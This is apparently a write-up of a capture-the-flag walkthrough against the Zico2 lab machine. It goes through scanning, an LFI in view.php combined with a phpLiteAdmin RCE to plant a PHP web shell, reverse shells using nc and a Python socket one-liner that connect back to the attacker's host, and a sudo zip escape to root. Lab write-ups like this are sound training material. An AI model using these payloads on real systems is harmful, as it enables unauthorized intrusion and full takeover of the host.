## Tool:Vmware,nmap,nikto,nc

Use nat type and discover the host by:

```bash
discover -r 
```

## Information Gathering

### Port scan

Use nmap to do a full scan on the target. Use command:

```bash
 nmap -Pn -sS —stats-every 3m —max-restries 1 —max-scan-delay 20 —defeat-rst-ratelimit -T4 -p- [ip]
```

We can notice that there is a http port opened.

### Nikto scan

Use nikto to scan the target

```bash
nikto -h [ip]
```

Not much information get from nikto, try dirscan.

### Dirscan(dirb,dirbuster,dirsearch)

some interesting path discovered.

**CLUE 1**

After browser the pathes, I found that the view.php seems has a LFI. so try

![zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%203.png](zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%203.png)

**CLUE 2**

There is another clue found by [README.md](http://readme.md)

![zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%204.png](zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%204.png)

It's a web structure, after google, no important clue found.

**CLUE 3**

the dbadmin reveals a phpLiteAdmin page.

![zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%205.png](zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%205.png)

Google this version, it seems there there is a RCE on this.

First try poc. Create a db named hack.php, then create a table in which insert a text.

```php
<?php phpinfo() ?>
```

Then use the LFI page to access this page.

![zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%206.png](zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%206.png)

It works.

## attack

try to upload a shell. first I should check is the target can connect my local mechine. use:

```php
<?php echo shell_exec("nc [ip] 443 "); ?>
```

use 443 port due to sometimes the uncommon port would be banned.

My local kali get the connection from the target. So try some shellcode.

```php
<?php echo shell_exec("nc 192.168.202.137 443 -e /bin/bash "); ?>
```

failed, maybe the nc on target donse't has -e option.

After many tries. I found this

```php
<?php $test = $_GET['cmd']; system($test); ?>
```

and use:

```bash
[http://[ip]/view.php?page=../.../../../usr/databases/hack.php&cmd=python](http://192.168.202.136/view.php?page=../.../../../usr/databases/hack.php&cmd=python) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.202.137",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

get shell.

It seems that there is no '-e' option.

## privilege escape

check the version of linux on target.

![zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%208.png](zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%208.png)

google and use [https://www.exploit-db.com/exploits/33589](https://www.exploit-db.com/exploits/33589) to have a try.

![zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%209.png](zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%209.png)

The target crashed.

Get in the home path, and found a wordpress, so look for the config. found the password of zico, so try to change the user.

use sudo -l to check the command can use.

![zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%2010.png](zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%2010.png)

We can use tar and zip to escape to root.

find a zip file, use this command:

```bash
sudo zip wordpress-4.8.zip wordpress-4.8 -T --unzip-command="sh -c /bin/bash"
```

![zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%2011.png](zico2-walkthough%207e7746d034734ffbb544096c923820c5/Untitled%2011.png)

got root.
